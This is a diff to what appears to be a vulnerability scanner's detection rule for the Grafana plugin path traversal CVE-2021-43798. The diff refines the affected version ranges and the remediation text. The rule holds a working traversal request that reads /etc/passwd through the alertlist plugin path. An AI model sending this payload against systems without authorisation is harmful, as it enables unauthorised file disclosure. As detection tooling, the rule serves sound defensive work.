@@ -9,7 +9,7 @@
 
 [detection]
 id      = "grafana-path-traversal"
-version = "1.0.0"
+version = "1.1.0"
 title   = "Grafana plugin path traversal (CVE-2021-43798)"
 
 # Both names, because the fingerprint corpus produces both for one server. A
@@ -35,8 +35,14 @@ send        = "GET /login HTTP/1.1\r\nHost: localhost\r\nAccept: */*\r\n\r\n"
 bind        = { version = "Grafana v(?<version>[0-9.]+)" }
 on_no_match = "continue"
 
-[[step]]                        # conditional: only attempt against an affected version (< 8.3.1)
-when        = "bound(version) and version < '8.3.1'"
+# Conditional: only against an affected version. 8.0.0 through 8.3.0 are affected,
+# and each line was fixed in its own release: 8.0.7, 8.1.8, 8.2.7 and 8.3.1.
+[[step]]
+when        = """bound(version) and (
+                 (version >= '8.0.0' and version < '8.0.7')
+              or (version >= '8.1.0' and version < '8.1.8')
+              or (version >= '8.2.0' and version < '8.2.7')
+              or (version >= '8.3.0' and version < '8.3.1'))"""
 send        = "GET /public/plugins/alertlist/../../../../../../../../etc/passwd HTTP/1.1\r\nHost: localhost\r\nAccept: */*\r\n\r\n"
 expect      = 'root:.*:0:0:'                            # a real /etc/passwd line — confirmation
 on_no_match = "continue"
@@ -52,12 +58,12 @@ on_no_match = "continue"
     { cwe = 22 },
     { url = "https://grafana.com/security/security-advisories/cve-2021-43798/" },
   ]
-  remediation  = "Upgrade to Grafana 8.3.1 or later."
+  remediation  = "Upgrade to Grafana 8.3.1 or later, or to 8.0.7, 8.1.8 or 8.2.7 on those lines."
   excerpt_from = "$response"                            # the leaked passwd bytes
 
   [[step.finding]]              # a version match without a confirmed leak is still worth a note
   when       = "not matched and bound(version)"
   severity   = "medium"
   summary    = "Grafana version is in the affected range but the leak did not confirm"
-  detail     = "Grafana {version} is < 8.3.1 (CVE-2021-43798) but the probe did not read a file."
+  detail     = "Grafana {version} is in the range CVE-2021-43798 affects, but the probe did not read a file."
   references = [{ cve = "CVE-2021-43798" }]
